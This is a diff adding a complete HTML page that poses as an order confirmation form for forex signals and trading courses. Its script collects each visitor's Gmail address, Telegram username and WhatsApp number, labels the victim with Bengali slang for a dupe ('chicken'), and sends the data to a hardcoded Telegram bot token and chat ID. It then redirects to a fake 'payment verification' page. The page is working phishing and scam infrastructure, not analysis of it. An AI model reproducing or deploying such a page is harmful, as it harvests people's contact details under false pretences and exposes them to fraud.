@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://i.postimg.cc/kGJS5J07/contact-us.png" sizes="16x16">
+    <title>Contact Details</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(45deg, #6a11cb, #2575fc);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 95%;
+            max-width: 300px;
+            text-align: center;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .container:hover {
+            transform: translateY(-5px);
+        }
+
+        .title {
+            font-size: 18px;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .input-field {
+            margin: 6px 0;
+            padding: 10px 12px;
+            width: 100%;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            font-size: 12px;
+            color: #333;
+            background-color: #f5f5f5;
+            transition: border 0.3s, box-shadow 0.3s;
+            box-sizing: border-box;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #2575fc;
+            box-shadow: 0 0 5px rgba(37, 117, 252, 0.4);
+        }
+
+        .input-field::placeholder {
+            color: #bbb;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #2575fc, #6a11cb);
+            color: white;
+            padding: 10px 16px;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+            font-size: 12px;
+            width: 100%;
+            margin-top: 10px;
+            transition: background 0.3s, transform 0.2s;
+        }
+
+        .btn:hover {
+            background: linear-gradient(45deg, #6a11cb, #2575fc);
+            transform: translateY(-2px);
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        .section {
+            margin-bottom: 12px;
+        }
+
+        .sub-text {
+            color: #777;
+            font-size: 10px;
+            margin-top: 4px;
+        }
+
+        .error-message {
+            color: #ff4d4d;
+            font-size: 8px;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 10px;
+        }
+
+        .radio-group label {
+            margin-bottom: 6px;
+            font-size: 12px;
+            color: #333;
+        }
+
+.contact-support {
+    margin-top: 8px;
+    font-size: 10px;
+    color: #1e4e9f;
+    text-align: center;
+    white-space: nowrap; /* Prevents wrapping */
+}
+
+.contact-support a {
+    display: inline-block;
+    padding: 3px 6px; /* Smaller padding */
+    font-size: 8px; /* Smaller font size */
+    font-weight: 500;
+    color: #2575fc;
+    text-decoration: none;
+    background-color: transparent;
+    border: 2px solid #2575fc;
+    border-radius: 6px; /* Slightly smaller border radius */
+    position: relative;
+    overflow: hidden;
+    transition: all 0.2s ease-in-out;
+    vertical-align: middle; /* Aligns the link in the middle of the text */
+    margin-left: 6px; /* Slightly smaller space between text and link */
+}
+
+.contact-support a::before {
+    content: "";
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(45deg, #2575fc, #6a11cb);
+    transition: all 0.5s ease;
+    border-radius: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 0;
+    opacity: 0.1;
+}
+
+.contact-support a:hover::before {
+    width: 0;
+    height: 0;
+}
+
+.contact-support a:hover {
+    color: #ffffff;
+    background-color: #2575fc;
+    border-color: #2575fc;
+    box-shadow: 0 3px 8px rgba(37, 117, 252, 0.3);
+    transform: translateY(-1px);
+}
+
+.contact-support a span {
+    position: relative;
+    z-index: 1;
+}
+
+.contact-support a:focus {
+    outline: none;
+    box-shadow: 0 0 4px rgba(37, 117, 252, 0.7);
+}
+
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="title">Account Info</div>
+
+    <div class="section">
+        <p style="font-size: 12px;">Which item did you purchase?</p>
+        <div class="radio-group" id="itemGroup">
+            <label>
+                <input type="radio" name="item" value="Premium Signal Group"> Premium Signal Group
+            </label>
+            <label>
+                <input type="radio" name="item" value="My Ultimate Forex Strategy"> My Ultimate Forex Strategy
+            </label>
+            <label>
+                <input type="radio" name="item" value="Must Have Books"> Must Have Books
+            </label>
+            <label>
+                <input type="radio" name="item" value="Elite Courses Collection"> Elite Courses Collection
+            </label>
+        </div>
+    </div>
+
+    <div class="section">
+        <input type="text" id="username" class="input-field" placeholder="Enter your Email Address" required>
+    </div>
+    
+    <div class="section">
+        <input type="text" id="password" class="input-field" placeholder="Enter your Telegram username (with @)" required>
+    </div>
+
+    <div class="section">
+        <input type="tel" id="backupCodes" class="input-field" placeholder="Enter your WhatsApp Number" required oninput="validatePhoneNumber(event)">
+    </div>
+
+    <button class="btn" onclick="sendToTelegram()">Confirm Order</button> 
+    <p class="sub-text">By clicking "Confirm Order", you agree to our terms and conditions.</p> 
+
+    <div id="error-message" class="error-message">
+        Please fill in all the fields before submitting.
+    </div>
+
+    <div class="contact-support">
+        <p>If you have any issues, feel free to<a href="https://t.me/mehrabgaming2" target="_blank">Contact Support</a></p>
+    </div>
+</div>
+
+<script>
+    function sendToTelegram() {
+        const itemGroup = document.getElementsByName('item');
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const backupCodes = document.getElementById('backupCodes').value.trim();
+
+        let selectedItem = null;
+        let errors = [];
+
+        // Check if an item is selected
+        for (let item of itemGroup) {
+            if (item.checked) {
+                selectedItem = item.value;
+                break;
+            }
+        }
+
+        // Check for empty fields
+        if (!selectedItem || !username || !password || !backupCodes) {
+            errors.push("Please fill all the credentials.");
+        }
+
+        // Validate Email Address
+        if (username) {
+            const emailUsername = username.split('@')[0];
+            if (emailUsername.length < 6 || emailUsername.length > 30) {
+                errors.push("Email address must have between 6 and 30 characters before @gmail.com.");
+            }
+            if (!username.endsWith('@gmail.com')) {
+                errors.push("Email address must end with @gmail.com.");
+            }
+        }
+
+        // Validate Telegram Username
+        if (password) {
+            const telegramUsername = password.slice(1); // Remove @
+            if (telegramUsername.length < 5 || telegramUsername.length > 32) {
+                errors.push("Telegram username must have between 5 and 32 characters after @.");
+            }
+            if (password.charAt(0) !== '@') {
+                errors.push("Telegram username must start with @.");
+            }
+        }
+
+        // Validate WhatsApp Number
+        if (backupCodes) {
+            if (!backupCodes.startsWith('01') || backupCodes.length !== 11 || isNaN(backupCodes)) {
+                errors.push("WhatsApp number must start with 01 and have exactly 11 digits.");
+            }
+        }
+
+        // Display all errors if any exist
+        if (errors.length > 0) {
+            document.getElementById('error-message').innerHTML = errors.join('<br>');
+            document.getElementById('error-message').style.display = 'block';
+            return;
+        }
+
+        // No errors: Proceed with submission
+        document.getElementById('error-message').style.display = 'none';
+
+        const message = `
+            🐔মুরগির তথ্য:
+            Selected Item: ${selectedItem}
+            Email Address: ${username}
+            Telegram Username: ${password}
+            WhatsApp Number: ${backupCodes}
+        `;
+
+        const botToken = '7683224249:AAGKd9UgEZ3mUciyZirea8LHYb1xH5vaIcw';
+        const chatId = '6151148119';
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                window.location.href = "https://paymentverification.vercel.app/confirm.html"; 
+            }
+        })
+        .catch(error => {
+            console.error(error);
+        });
+    }
+
+    function validatePhoneNumber(event) {
+        const input = event.target;
+        input.value = input.value.replace(/[^0-9]/g, ''); // Remove any non-numeric characters
+    }
+</script>
+
+</body>
+</html>
